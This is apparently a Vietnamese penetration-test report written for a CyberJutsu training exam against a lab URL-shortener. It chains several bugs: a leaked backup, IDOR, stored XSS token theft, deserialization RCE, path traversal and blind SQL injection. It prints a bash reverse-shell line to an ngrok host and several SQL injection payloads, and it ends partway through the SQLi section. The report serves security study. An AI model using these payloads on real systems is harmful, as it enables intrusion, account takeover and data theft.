---
layout: post
title:  "Report Final Exam"
date:   2025-05-23 20:15:00 +0700
tags: Report CBJS
categories: jekyll update
---

# I. Tổng quan

## 1. Mục tiêu 
Báo cáo nhằm liệt kê các lỗ hổng bảo mật và các vấn đề liên quan được phát hiện trong quá trình kiểm thử bảo mật của ứng dụng `CyberShortLink - Website rút gọn liên kết nhanh chóng`.

## 2. Đối tượng 
Mục tiêu kiểm thử bao gồm:
- `https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech`

## 3. Phạm vi 
Phạm vi kiểm thử bao gồm toàn bộ chức năng của ứng dụng `CyberShortLink - Website rút gọn liên kết nhanh chóng` được triển khai trên đối tượng.
Quá trình kiểm thử được thực hiện trong môi trường CyberJutsu Academy cung cấp, không gây ảnh hưởng đến hệ thống thực tế. Phương pháp kiểm thử áp dụng là Black-box. Các công cụ và kỹ thuật kiểm thử tuân thủ quy định của bài kiểm tra, đảm bảo tính hợp pháp và an toàn.

## 4. Quy ước đặt mã lỗ hổng
Các lỗ hổng được phát hiện trong quá trình kiểm thử sẽ được đặt mã định danh theo quy ước sau:
- **CBL-[Số thứ tự]**: Lỗ hỗng trên `https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech`

Số thứ tự được đánh tăng dần theo thứ tự liên quan đến các lỗ hổng, dựa trên luồng khai thác thực tế.

## 5. Bảng tổng hợp các lỗ hổng 
![image](https://hackmd.io/_uploads/Sy3d05efee.png)
<p style="text-align:center"><em>Lỗ hổng tại <code>https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech</code></em></p>



# II. Chi tiết các lỗ hổng bảo mật
## 1. CBL-01: Source Code Disclosure via Exposed `backup.zip`

### Description and Impact
Tại website `https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/`, ứng dụng cho phép tải file `backup.zip` mà không có bất kỳ biện pháp bảo vệ nào thông qua file `.htaccess` hoặc cơ chế bảo mật khác. 
File `backup.zip` này chứa toàn bộ mã nguồn của ứng dụng, cấu hình, hoặc thông tin nhạy cảm khác của hệ thống. Việc lộ mã nguồn tạo điều kiện cho kẻ tấn công có thể khai thác.

### Root Cause Analysis
Lỗ hổng xảy ra do cấu hình không đầy đủ của máy chủ tại web `https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/`. File `.htaccess` dùng `Options -Indexes` để ngăn chặn liệt kê file. Nhưng lại không có bất kỳ quy tắc nào bảo vệ truy cập đến file `backup.zip`. 
Các quy tắc `RewriteCond %{REQUEST_FILENAME} !-d` và `!-f` chỉ chuyển hướng yêu cầu không hợp lệ đến `index.php`, nhưng không áp dụng cho file nhạy cảm như `backup.zip`.Từ đây kẻ tấn công có thể thực hiện scan directory để truy cập và tải xuống, sau đó có thể khôi phục mã nguồn. 

![image](https://hackmd.io/_uploads/HyRodxyMlg.png)
<p style="text-align:center"><em>File `.htaccess`</em></p>

Nguyên nhân chính là do lập trình viên đã không có các biện pháp ngăn chặn truy cập file `backup.zip` hoặc xóa bỏ file ra khỏi môi trường production.

### Step to reproduce 
Đầu tiên, ta sử dụng công cụ `dirsearch` với lệnh:
```bash=
python dirsearch.py -u https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/
```
![image](https://hackmd.io/_uploads/r1iEVl1fge.png)
<p style="text-align:center"><em>Scan Directory</em></p>

Sau đó truy cập `https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/backup.zip`, thì ta có thể tải file về.

![image](https://hackmd.io/_uploads/r1gtKgkfxl.png)
<p style="text-align:center"><em>Source Code</em></p>

Như vậy ta đã lấy thành công toàn bộ source code.

### Recommendations 
- Không nên lưu trữ file sao lưu, mã nguồn, hoặc bất kỳ dữ liệu nhạy cảm nào trên môi trường production.
- Áp dụng chính sách backup an toàn, trong đó sao lưu phải được lưu trữ ở khu vực riêng biệt, nên được mã hóa và giới hạn quyền truy cập.

### References 
- https://github.com/maurosoria/dirsearch

## 2. CBL-02: IDOR in API Endpoint`/api/admin/users/{userId}/links` Due to Missing Admin Middleware

### Description and Impact 
Tại file `web/html/routes/api.php` là một endpoint được định nghĩa trong nhóm API dành cho người dùng đã xác thực và `admin`, nhưng lại thiếu cơ chế phân quyền `admin` như dùng `middleware admin` cho `/admin/users/{userId}/links`. 
Điều này cho phép người dùng bình thường đã đăng nhập có thể truy cập vào dữ liệu của người dùng khác chỉ bằng cách thay đổi `userId` trong đường dẫn API. Dẫn đến làm rò rỉ thông tin nhạy cảm như thông tin người dùng, thông tin link, thông tin truy cập,...

### Root Cause Analysis
Nguyên nhân chính là file tại `web/html/routes/api.php`, đã thiếu đi cơ chế kiểm tra quyền dành cho `admin` ở dòng số 30.

![image](https://hackmd.io/_uploads/HkxwyWbJMxe.png)
<p style="text-align:center"><em>File api.php</em></p>

Sau đó, nó được gọi tới hàm `getLinksByUser` ở `web/html/app/Http/Controllers/Api/AdminController.php`, hàm này được dùng để lấy các thông tin của một user thông qua truyền vào `id`.

![image](https://hackmd.io/_uploads/H1KqbZkfxl.png)
<p style="text-align:center"><em>File AdminController.php</em></p>

Như vậy, người dùng có thể thay đổi `userId` bất kỳ để xem thông tin tùy ý. 

### Step to reproduce 
Sau khi tạo 1 tài khoản, thực hiện chức năng rút ngắn gọn link và quan sát trong BurpSuite. Thì ta thấy sẽ có các api được trả về như sau:
- `/api/me`
- `/api/links`

Đối với `/api/me` sẽ trả về các thông tin của tài khoản mình đã tạo.

![image](https://hackmd.io/_uploads/BkzSVWyGgl.png)
<p style="text-align:center"><em>Request `/api/me`</em></p>

Còn đối với `/api/links` thì trả về các thông tin của các đường link mình đã rút ngắn gọn. 

![image](https://hackmd.io/_uploads/ryoeSW1Ggx.png)
<p style="text-align:center"><em>Request `/api/links`</em></p>

Sau đó, mình chọn 1 request gửi sang Intruder để chỉnh sửa lại endpoint api thành `/api/users/admin/{userId}/links`.

![image](https://hackmd.io/_uploads/SJ3aDZyfxx.png)
<p style="text-align:center"><em>Set payload để dò thử từng `id`</em></p>

Sau khi đã set các payload để brute-force mình được như sau:

![image](https://hackmd.io/_uploads/S1hbOWJfle.png)
<p style="text-align:center"><em>Kết quả thông tin danh sách link của 1 user</em></p>

Từ đây, có thể xem hết thông tin danh sách link của bất kỳ user nào. Kể cả là thông tin `alias`, thông tin để bảo vệ cho link được sự riêng tư.

### Recommendations 
- Nên áp dụng `middleware admin` cho endpoint `/api/users/admin/{userId}/links` để đảm bảo chỉ có `admin` mới có thể truy cập endpoint này.

### References 
- https://portswigger.net/web-security/access-control/idor
- https://portswigger.net/web-security/access-control#how-to-prevent-access-control-vulnerabilities

## 3. CBL-03: Link Password Disclosure via `/links/{alias}/password` API Endpoint 

### Description and Impact
Tại file `web/html/routes/api.php` có API endpoint `/api/links/{alias}/password` trả về mật khẩu của liên kết chỉ dựa vào giá trị `alias`, mà không kiểm tra quyền truy cập của người dùng với liên kết đó.
Điều này cho phép bất kỳ người dùng đã xác thực nào cũng có thể thu thập mật khẩu của các liên kết không thuộc sở hữu của họ, nếu biết được `alias` qua lỗ hổng **CBL-02**.
Lỗ hổng này làm rò rỉ thông tin nhạy cảm và có thể bị lợi dụng để truy cập trái phép vào các liên kết riêng tư.

### Root Cause Analysis 
Nguyên nhân chính của lỗ hổng này là do API `/api/links/{alias}/password` không thực hiện việc kiểm tra  quyền truy cập (authorization) đối với liên kết được yêu cầu. 
Cụ thể rằng API chỉ yêu cầu người dùng đã xác thực (authenticated), nhưng không xác thực rằng người đó có quyền sở hữu hoặc được phép truy cập vào.

![image](https://hackmd.io/_uploads/rkSmmfyGex.png)
<p style="text-align:center"><em>File api.php</em></p>

Ở dòng 21, đã thiếu đi kiểm tra quyền, mà chỉ dành cho người dùng đã xác thực. 
Sau đó, gọi tới hàm `getLinkPassword` ở `web/html/app/Http/Api/LinkController.php`.

![image](https://hackmd.io/_uploads/HkTJSMkMlx.png)
<p style="text-align:center"><em>File `LinkController.php`</em></p>

Ở dòng 34, truy vấn bản ghi có `alias` đúng bằng chuỗi do người dùng gửi.
Ở dòng 38, nếu tìm thấy bản ghi, API trả ngay trường `password` dưới dạng JSON.
Như vậy, kẻ tấn công đã có thể lợi dụng lỗ hổng **CBL-02** để lấy `alias` của người khác, sau đó dùng nó để lấy `password`. Từ đây, đã có thể xem được link có mật khẩu bảo vệ.

### Step to reproduce 
Dựa vào lỗ hổng **CBL-02** đã khai thác, ta xác định được `alias` của `userId` bằng 1 là `secret-things`, và có `password` để không cho phép người khác vào xem.

![image](https://hackmd.io/_uploads/S1hbOWJfle.png)
<p style="text-align:center"><em>`alias` của userId=1 là secret-things</em></p>

Ở file `LinkController.php` tại vị trí `web/html/Http/Controllers` có hàm `go`, cho phép mình truy cập tới link rút gọn thông qua `alias` đã biết.

![image](https://hackmd.io/_uploads/SkGZKzJMxl.png)
<p style="text-align:center"><em>Hàm `go` trong file LinkController.php</em></p>

Sau đó, ta truy cập tới link rút gọn thông qua `alias` là `secret-things`. 

![image](https://hackmd.io/_uploads/HkmOKzyGle.png)
<p style="text-align:center"><em>Truy cập theo link `go/secret-things`</em></p>

Đến đây ta được yêu cầu nhập 1 `password`, ta sử dụng API `/api/links/secret-things/password` để lấy `password`.

![image](https://hackmd.io/_uploads/BJvh9Gkzex.png)
<p style="text-align:center"><em>Lấy `password` thành công</em></p>

Cuối cùng, ta cần nhập đúng `password` vừa lấy vào trong ô yêu cầu là đã có thể vào được.

![image](https://hackmd.io/_uploads/H1Hmof1Gxl.png)
<p style="text-align:center"><em>Truy cập thành công!</em></p>

![image](https://hackmd.io/_uploads/B1JIszkzex.png)
<p style="text-align:center"><em>Xem link gốc của người khác!</em></p>

`Flag 1: CBJS{f48bb27f98b5468b7af0b486b0adef83}`

### Recommendations 
- Không nên trả về mật khẩu qua API ngay cả khi người dùng đã xác thực.
- Nên áp dụng xác thực đúng người sở hữu link mới trả password.

## 4. CBL-04: Stored XSS at `/go/alias` Lead to Token Theft via `/generate-token` API Endpoint and Privilege Escalation via `/admin/users/{userId}` method `PUT`  

### Description and Impact
Ứng dụng tồn tại lỗ hổng stored xss tại file `safe-redirect.blade.php` ở vị trí `web/html/resources/views/links/`, cho phép kẻ tấn công chèn và lưu trữ mã JavaScript độc hại. 
Khi người dùng truy cập vào link rút gọn chứa `payload`, mã này sẽ được thực thi và có thể đánh cắp các thông tin bảo mật như token từ API `/generate-token` và leo quyền tại `/admin/users/{userId}`.

### Root Cause Analysis 
Lỗ hổng xảy ra khi tạo một link rút gọn và có bật chức năng chuyển hướng an toàn được xử lý thông qua file `LinkController.php` tại `web/html/app/Http/Controllers`.

![image](https://hackmd.io/_uploads/H167yPgMeg.png)
<p style="text-align:center"><em>File `LinkController.php`</em></p>

Từ dòng 17-39, validate `URL` cũng như `password`, và kiểm tra xem người dùng có nhập vào `alias`, nếu không có thì tự tạo ra.

![image](https://hackmd.io/_uploads/Bk_O1PxMex.png)
<p style="text-align:center"><em>File `LinkController.php`</em></p>

Từ dòng 42-50 , nó gọi tới ứng dụng nội bộ qua dòng 48 đến `/api/v2/processUrl` API Endpoint tại vị trí`internal/app/routes/urlRoutes.js` sau đó gán vào biến `$preview`.

![image](https://hackmd.io/_uploads/B1qIMDeMlx.png)
<p style="text-align:center"><em>File `urlRoutes.js`</em></p>

Chức năng của hàm `preview` tại file `urlRoutes.js`, thực hiện phân tích `title` và `description` sau đó ghi lại log.

Khi gọi tới biến `$priview` ở dòng 52 để trả về theo dạng JSON.

![image](https://hackmd.io/_uploads/r1dQmweMxl.png)
<p style="text-align:center"><em>File `LinkController.php`</em></p>

Sau đó, lưu nó lại vào trong database qua dòng 65-66.

Khi người dùng click vào link rút gọn, trang `safe-redirect.blade.php` sẽ nhận dữ liệu `title` và `description` đã lưu và gán 2 biến là `$pageTitle` và `$pageDescription`, rồi chèn những giá trị này vào các vị trí tương ứng trong HTML.

![image](https://hackmd.io/_uploads/Hy1zJUJzgg.png)
<p style="text-align:center"><em>File `safe-redirect.blade.php`</em></p>

Trong đó, biến `$pageDescription` rơi vào `{!! !!}` ở dòng 20 - đây là cú pháp render ra tag HTML mà không có escape.
Mà giá trị biến `$pageDescription`, được lấy từ thẻ `<meta name="description" content="{{ $pageDescription }}">` tại `default.blade.php`.

![image](https://hackmd.io/_uploads/H1u4lLyMlx.png)
<p style="text-align:center"><em>File `default.blade.php`</em></p>

Tóm lại, do dữ liệu `description` được lưu và in ra trực tiếp mà không có bất kỳ bước kiểm tra hoặc mã hóa dữ liệu (escaping) nào, nếu kẻ tấn công nhập payload chứa `script` vào trường `description` khi tạo link rút gọn, payload đó sẽ được chèn thẳng vào thẻ `meta og:description`, rồi sau đó render ra dựa vào `{!! !!}` mà không escape dẫn đến Stored XSS.
Từ đó, kẻ tấn công có thể thực hiện chiếm đoạt token admin để thao tác nhiều chức năng với user admin.

### Step to reproduce
Đầu tiên, ta sẽ viết file `index.html` như sau:
![image](https://hackmd.io/_uploads/ryW3YExMxx.png)
<p style="text-align:center"><em>File `index.html`</em></p>

Sau đó, host file bằng [requestrepo](https://requestrepo.com/). Rồi gửi vào trong chức năng rút gọn link của web.

![image](https://hackmd.io/_uploads/ByWHqVgGgl.png)
<p style="text-align:center"><em>Host file bằng `requestrepo`</em></p>

![image](https://hackmd.io/_uploads/SJbtcVxGxe.png)
<p style="text-align:center"><em>Sau khi đã rút gọn link</em></p>

Tiếp theo, ta truy cập vào link đã rút gọn đó.

![image](https://hackmd.io/_uploads/HkVaqVxMll.png)
<p style="text-align:center"><em>payload xss đã hoạt động</em></p>

Đầu tiên, ta sẽ viết file HTML có chứa payload XSS dò tìm lấy `XSRF-TOKEN` của `admin`, sau đó gửi sang server webhook.

![image](https://hackmd.io/_uploads/r1oU1_xzlg.png)
<p style="text-align:center"><em>File HTML chứa payload XSS</em></p>

Sau đó, host file tương tự lên [reporequest](https://requestrepo.com/). Rồi gửi lên web để rút gọn link sau đó gửi cho `admin`.

Ở webhook mình thu được `XSRF-TOKEN` của admin như sau:

![image](https://hackmd.io/_uploads/SyRWmulzxe.png)
<p style="text-align:center"><em>Kết quả trả về qua webhook</em></p>

Như vậy, ta có thể gửi `XSRF-TOKEN` này đến api `/generate-token` ở file`auth.js` tại `web/html/public/` để có thể lấy 1 token xác thực dưới quyền admin.

![image](https://hackmd.io/_uploads/B1698ulMge.png)
<p style="text-align:center"><em>File `auth.js`</em></p>

Ở đây, có một vấn đề cần phải làm rõ là trong file `auth.js` khi gọi tới API `/generate-token` nó dùng `X-CSRF-TOKEN` truy vấn tới 1 `csrf-token` được lưu trong thẻ `meta`. 
Nhưng ta lại thực hiện đi lấy `X-XSRF-TOKEN`, điều này liên quan đến cơ chế bảo vệ `csrf-token` của Laravel.
Cả hai đều cơ chế bảo vệ `csrf-token`, nhưng có chút khác biệt:
- `X-XSRF-TOKEN` được Laravel tự tạo ra trong Cookie với mỗi response, không cần manual setup trong HTML.
- `X-CSRF-TOKEN` được lập trình viên nhúng vào qua thẻ `<meta name="csrf-token" content="{{ csrf_token() }}">` 

Như vậy, khi mình truyền trong file payload là `X-XSRF-TOKEN` là để không bị phụ thuộc vào `csrf-token` đã nhúng trong thẻ `meta`.

![image](https://hackmd.io/_uploads/Bk1w_dxfge.png)
<p style="text-align:center"><em>File `xss.html`</em></p>

Sau đó, mình host file này lên [requestrepo](https://requestrepo.com/). Tiếp theo, lấy link để rút ngắn lại.

![image](https://hackmd.io/_uploads/rkapKUJMel.png)
<p style="text-align:center"><em>Rút gọn link thành công</em></p>

Cuối cùng, gửi link rút gọn đã chứa payload xss này cho admin tại `https://tung-tung-tung-sahur.victim.cyberjutsu-lab.tech/`.

![image](https://hackmd.io/_uploads/HkG-9I1Gxe.png)
<p style="text-align:center"><em>Gửi link cho admin</em></p>

Quay lại webhook thì mình đã có được token hợp lệ của admin.

![image](https://hackmd.io/_uploads/BkQhP_gfex.png)
<p style="text-align:center"><em>Kết quả webhook trả về</em></p>


Như vậy thì mình đã có thể sử dụng các API dưới quyền admin một cách hợp lệ. 

Trong file `api.php` tại `web/html/routes/`, có các đường dẫn api dưới quyền admin.

![image](https://hackmd.io/_uploads/rkgdhI1Gel.png)
<p style="text-align:center"><em>File `api.php`</em></p>

Sau đó mình truy cập `/api/admin/sup3rs3cr3t` 

![image](https://hackmd.io/_uploads/SkxCh8kzee.png)

`Flag 2: CBJS{5fa3ec43f5d310230f53dfa302b808b4}`

Sau khi có token hợp lệ là admin thì mình có thể đổi `role` user thông qua dòng 29 ở file `api.php`.
Mình sẽ sửa lại tài khoản mình có `role` là admin.

![image](https://hackmd.io/_uploads/HkWd7vkzgl.png)
<p style="text-align:center"><em>role ban đầu là `user`</em></p>

![image](https://hackmd.io/_uploads/SkkRQDJfex.png)
<p style="text-align:center"><em>update role user là `admin`</em></p>

![image](https://hackmd.io/_uploads/rkUM4wkGee.png)
<p style="text-align:center"><em>Kiểm tra lại sau khi update role</em></p>

Sau đó mình có thể login tài khoản với vai trò admin đã leo thang đặc quyền thành công.

![image](https://hackmd.io/_uploads/HypiED1Mgx.png)
<p style="text-align:center"><em>Login Admin Panel thành công!</em></p>


### Attachments
- `xss.html`

### Recommendations
- Escape output trước khi render ra HTML.
- Validate & sanitize dữ liệu đầu vào khi người dùng rút gọn link.
- Tách metadata khỏi input người dùng.

### References 
- https://hackerone.com/reports/309367
- https://portswigger.net/web-security/cross-site-scripting
- https://portswigger.net/web-security/cross-site-scripting/preventing
- https://laravel.com/docs/12.x/csrf

## 5. CBL-05: RCE via Insecure Unserialize in Admin Restore Configs Through `Laravel/Monolog Gadget Chains`

### Description and Impact 
Lỗ hổng này xảy trong chức năng `Restore` của Admin Panel sau khi leo quyền thành `admin` tại lỗ hổng **CBL-04** ta đã có thể vào trong `Admin Panel`, nó xử lý tệp sao lưu mà không thực hiện kiểm tra an toàn trên nội dung. 
Việc xử lý dữ liệu đầu vào không đúng cách dẫn đến khả năng thực thi mã từ xa (RCE) nếu có thư viện chứa gadget độc hại được cài đặt trên hệ thống. Kẻ tấn công có thể giành quyền kiểm soát máy chủ nếu khai thác thành công.

![image](https://hackmd.io/_uploads/SkQDKOyMle.png)
<p style="text-align:center"><em>Chức năng Restore Config ở Admin Panel</em></p>


### Root Cause Analysis
Lỗ hổng xảy ra khi trong file `AdminController.php` ở vị trí `web/html/app/Http/Controllers`.
Hàm `restoreConfigs()` trong file `AdminController.php` cho phép người dùng tải lên tệp tin `.sav` hoặc `.txt`, sau đó sử dụng `base64_decode()` kết hợp với `unserialize()` mà không xác thực kiểu dữ liệu đầu vào.

![image](https://hackmd.io/_uploads/r1wUVdJMge.png)
<p style="text-align:center"><em>File `AdminController.php`</em></p>

Trong khi đó, hệ thống đang sử dụng các thư viện như `monolog/monolog 3.0` và `laravel/framework 10.31.0` với phiên bản tồn tại gadget có thể bị lợi dụng để thực thi mã tùy ý khi `unserialize`. Điều này tạo điều kiện để kẻ tấn công thực hiện Remote Code Execution nếu gửi vào payload độc hại qua file upload.

![image](https://hackmd.io/_uploads/BkHLS_Jzxg.png)
<p style="text-align:center"><em>`monolog/monolog 3.0`</em></p>

![image](https://hackmd.io/_uploads/SkJsHdkMeg.png)
<p style="text-align:center"><em>`laravel/framework 10.31.0`</em></p>

### Step to reproduce 
Đầu tiên, mình sẽ sử dụng công cụ `phpggc`, để kiểm tra xem có các thư viện trên, mình dùng lệnh sau:
```bash=
./phpggc -l Monolog 
```
![image](https://hackmd.io/_uploads/SyPhUdyzgl.png)
<p style="text-align:center"><em>`monolog/monolog 3.0`</em></p>

Tương tự mình cũng có thể liệt kê với `Laravel`
```bash=
./phpggc -l Laravel 
```
![image](https://hackmd.io/_uploads/HyQdvOkMxl.png)
<p style="text-align:center"><em>`laravel/framework 10.31.0`</em></p>

Từ đây, mình dùng payload để RCE. 
Đầu tiên là `Monolog` với payload như sau: 
![image](https://hackmd.io/_uploads/HJgQYOyfgl.png)
<p style="text-align:center"><em>payload `Monolog`</em></p>

Sau đó mình gửi file này lên chỗ `Restore`. 

![image](https://hackmd.io/_uploads/S19y5u1Mlg.png)
<p style="text-align:center"><em>Request trả về trên webhook</em></p>

Tiếp theo là `Laravel` với payload như sau: 
![image](https://hackmd.io/_uploads/BJadc_kzxl.png)
<p style="text-align:center"><em>payload `Laravel`</em></p>

Sau đó mình gửi file này lên chỗ `Restore`. 

![image](https://hackmd.io/_uploads/r1tlidyMgg.png)
<p style="text-align:center"><em>Request trả về trên webhook</em></p>

Như vậy, mình hoàn toàn có thể tạo 1 `reverse shell` để RCE.

Sau đó, mình thay đổi payload thành 1 `reverse shell` như sau: 
```bash=
'bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/YOUR_PORT 0>&1"'
```

![image](https://hackmd.io/_uploads/BJoi2dyMex.png)
<p style="text-align:center"><em>Thay đổi payload</em></p>

Ta sử dụng `ngrok` để công khai một cổng TCP trên máy local ra Internet.

![image](https://hackmd.io/_uploads/rJdzpOJzel.png)
<p style="text-align:center"><em>Public một kết nối TCP ra ngoài internet bằng ngrok</em></p>

![image](https://hackmd.io/_uploads/r1ABp_kfle.png)
<p style="text-align:center"><em>Mở kết nối TCP ở local để chờ reverse shell</em></p>

Sau khi gửi file `payload` đã tạo lên chỗ `Restore`, lệnh `bash` sẽ kết nối đến host và port được cung cấp bởi ngrok, từ đó ánh xạ về `netcat` đang chờ sẵn.

![image](https://hackmd.io/_uploads/r1h70uJzlx.png)
<p style="text-align:center"><em>Kết nối thông qua reverse shell thành công</em></p>

`Flag 3 : CBJS{ee7f0a97dc5d3a16ed58043e3ffe617a}`

## Recommendations 
- Không sử dụng `unserialize()` với dữ liệu không tin cậy từ người dụng.
- Gỡ hoặc nâng cấp các thư viện dễ bị khai thác RCE.
- Thêm cơ chế kiểm tra chữ ký hoặc checksum cho file cấu hình.

## References 
- https://github.com/ambionics/phpggc
- https://portswigger.net/web-security/deserialization#how-to-prevent-insecure-deserialization-vulnerabilities
- https://portswigger.net/web-security/deserialization/exploiting#gadget-chains

## 6. CBL-06: Path Travesal in Web Internal via `/proc/self/environ` Leak `INTERNAL_SERVICE_API_KEY` and `INTERNAL_SERVICE_URL`

### Description and Impact 
Từ lỗ hổng **CBL-05**, kẻ tấn công có thể đọc được `/proc/self/environ` từ đây để lộ ra nhiều thông tin nhạy cảm trong đó có `INTERNAL_SERVICE_API_KEY` và `INTERNAL_SERVICE_URL`. Đặc biệt là các khóa API liên quan đến nội bộ. 
Từ đó kẻ tấn công có thể tác động sâu hơn vào trong hệ thông nội bộ.

### Root Cause Analysis 
Lỗ hổng bắt nguồn từ lộ `INTERNAL_SERVICE_API_KEY` và `INTERNAL_SERVICE_URL` từ việc đọc file `/proc/self/environ` sau khi đã RCE, từ đó kẻ tấn công có thể `curl` đến các `route` nội bộ một cách hợp lệ. 

![image](https://hackmd.io/_uploads/B1V_Et1Meg.png)
<p style="text-align:center"><em>cat `/proc/self/environ`</em></p>

Từ đây xác định được: 
- `INTERNAL_SERVICE_URL` = `http://internal:3000/`
- `INTERNAL_SERVICE_API_KEY` = `a72358c930f77893ec2a3ac62ddf253a`

Lỗ hổng Path Traversal xảy ra khi trong file `api.php` tại `web/html/routes`, có API gọi tới `/api/admin/logs/{date}`, được xác thực dưới quyền admin.

![image](https://hackmd.io/_uploads/BJmEvYyMle.png)
<p style="text-align:center"><em>File `api.php`</em></p>

Khi đó gọi tới hàm `getQueryLinkInfoLogs` nằm trong file `AdminController.php` tại `web/html/app/Http/Controllers/Api` lại gọi tới dịch vụ web nội bộ (internal).

![image](https://hackmd.io/_uploads/HJZIsFyfeg.png)
<p style="text-align:center"><em>File `AdminController.php`</em></p>

Từ đây, mình gọi tới api nội bộ là `/api/logs/read?date={$date}`. Dẫn mình đến 1 route ở file `urlRoutes.js` ở `internal/app/routes`.

![image](https://hackmd.io/_uploads/r1MBRtyMxg.png)
<p style="text-align:center"><em>File `urlRoutes.js`</em></p>

Việc lấy trực tiếp giá trị từ `query parameter date` và nối nó vào đường dẫn file, không kiểm tra hoặc giới hạn giá trị này. 
Ở dòng 203, đường dẫn `logFileName` rơi vào hàm `readFileSync` nghĩa là có thể đọc file theo đường dẫn đã truyền vào. Làm cho kẻ tấn công có thể thực hiện Path Traversal.

### Step to reproduce 
Từ lỗ hổng **CBL-05**, mình đã RCE được. Sau khi đã có `INTERNAL_SERVICE_URL` và `INTERNAL_SERVICE_API_KEY` thì mình thực hiện `curl` vào trong web nội bộ.

![image](https://hackmd.io/_uploads/HyEYZc1Gel.png)
<p style="text-align:center"><em>Truyền payload vào trong `date`</em></p>

![image](https://hackmd.io/_uploads/BJkBbc1zle.png)
<p style="text-align:center"><em>Đọc được `/etc/passwd`</em></p>

`Flag 4: CBJS{81722747b5eeaf5ae16b143032d5f4d4}`

### Recommendations
- Tránh lưu trữ các `API key`, URL dịch vụ nội bộ trong các biến môi trường.
- Validate và có biện pháp bảo để tránh lỗi liên quan đến đường dẫn file.
- Giới hạn quyền truy cập cho các dịch vụ nội bộ.
- Giám sát và ghi log các truy cập bất thường đến dịch vụ nội bộ. 

### References 
- https://portswigger.net/web-security/file-path-traversal
- https://portswigger.net/web-security/file-path-traversal#how-to-prevent-a-path-traversal-attack


## 7. CBL-07: SQL Injection in `/links?search=` Endpoint via search Parameter 

### Description and Impact 
Lỗ hổng xảy ra khi ứng dụng web có chức năng tìm kiếm link tại endpoint `/links`, trong đó tham số `search` được truyền trực tiếp vào câu truy vấn SQL mà không qua bất kỳ cơ chế lọc hoặc binding tham số nào. 
Điều này cho phép kẻ tấn công chèn mã SQL tùy ý (SQL Injection), dẫn đến việc truy xuất, thao tác hoặc thay đổi dữ liệu trái phép trong cơ sở dữ liệu.

### Root Cause Analysis 
Nguyên chính của lỗ hổng này xảy ra trong file `api.php` tại `web/html/routes` có 1 API đến `/links`.

![image](https://hackmd.io/_uploads/SyPpw51fge.png)
<p style="text-align:center"><em>File `api.php`</em></p>

Khi đó nó gọi tới hàm `getOrSearchLink`, tại file `LinkController.php` ở `web/html/app/Http/Controllers/Api`.

![image](https://hackmd.io/_uploads/BJAK_q1zlx.png)
<p style="text-align:center"><em>File `LinkController.php`</em></p>

Khi đó câu lệnh query nhận tham số `search` do người dùng truyền vào mà không có biện pháp bảo vệ. 
Từ đây kẻ tấn công có thể chèn các payload sql để trích xuất dữ liệu. 

Và tại `web/html/database/migrations` có chứa toàn bộ file cấu trúc trong database. 

![image](https://hackmd.io/_uploads/S1GM551flg.png)
<p style="text-align:center"><em>Các file cấu trúc tại `web/html/database/migrations`</em></p>

Trong đây nó chứa toàn bộ cột và bảng của database hiện tại.

### Step to reproduce 
Đầu tiên, ta truyền vào payload đầu tiên để thực hiện đóng chuỗi.
```bash=
%' AND 1='1
```
Lúc đó câu lệnh query đoạn WHERE sẽ thành: 
```bash=
... WHERE links.url LIKE '%%' AND 1='1%'
```
Khi so sánh `1='1%'` thì mysql sẽ luôn ép kiểu để trả về luôn đúng.

Vì nó truyền trực tiếp trên URL theo method `GET` nên phải encoded URL lại trước khi chạy payload.

![image](https://hackmd.io/_uploads/SJm9jcJGge.png)
<p style="text-align:center"><em>Câu query trả về toàn bộ thông tin trong bảng links</em></p>

Sau đó mình truyền tiếp payload thứ hai như sau:
```bash=
%' AND (SELECT DATABASE()) AND 1='1%' 
```

![image](https://hackmd.io/_uploads/HJE4hglGlg.png)
<p style="text-align:center"><em>Câu query không trả về gì hết</em></p>

Nghĩa là câu query đã trả về sai kết hợp với `AND 1=1` luôn đúng, thì câu query thành sai. Nên nó không in ra bất cứ gì.

Dựa vào đây mình kết luận được là khi query đúng thì nó trả về các trường như `id`, `alias`,... của table links. Còn sai thì không trả về gì hết. Thì đây là `Blind Sqli` dựa trên `Boolean`.

Và dựa vào mình đã biết được cấu trúc của bảng nên sẽ trích xuất bảng mình nghi ngờ mà không cần phải trích xuất toàn bộ trong database.

![image](https://hackmd.io/_uploads/S1X-0elGxl.png)
<p style="text-align:center"><em>Bảng nghi ngờ là bảng `flag` có cột là `content`</em></p>

Từ đây mình có thể viết một `script` python để có thể trích xuất dữ liệu dựa vào đã nghi ngờ.

Đầu tiên mình cần copy hết tất cả header về để đảm bảo rằng `script` chạy đúng và hợp lệ.

![image](https://hackmd.io/_uploads/B13N7meGgl.png)
<p style="text-align:center"><em>Copy header bằng extension của BurpSuite</em></p>


![image](https://hackmd.io/_uploads/Skd2OWeMgg.png)
<p style="text-align:center"><em>Script thực hiện dò độ dài của cột `content` trong table `flag`</em></p>

Ở dòng 15, đoạn `payload` được truyền vào URL thông qua hàm `send_request(payload)`.
Ở dòng 17, có thêm `delay` để không bị gửi quá nhanh khiến mình bị chặn gửi request quá nhiều.

Với `payload` xác định độ dài là:
```bash
%' AND (LENGTH(SELECT GROUP_CONCAT(content) FROM flag))={i} AND 1='1
```

Vòng lặp thử giá trị `i` từ 1 đến 199. Ở mỗi vòng, `script` gửi một truy vấn để kiểm tra xem độ dài của dữ liệu trong `content` có bằng `i` hay không. Nếu đúng, server phản hồi chứa `id`, đây là tín hiệu để kết luận rằng giá trị `i` là độ dài chính xác.

![image](https://hackmd.io/_uploads/rkgUI-gMge.png)
<p style="text-align:center"><em>Xác định được độ dài data trong cột `content`</em></p>

Sau khi xác định được độ dài của dữ liệu trong cột `content` (bước trước), đoạn `script` dưới đây tiếp tục thực hiện kỹ thuật `Blind SQL Injection` kết hợp tìm kiếm nhị phân (Binary Search) để trích xuất từng ký tự một cách hiệu quả:

![image](https://hackmd.io/_uploads/B1M8F-xzxx.png)
<p style="text-align:center"><em>`Script` thực hiện lấy data từ của cột `content` trong table `flag`</em></p>

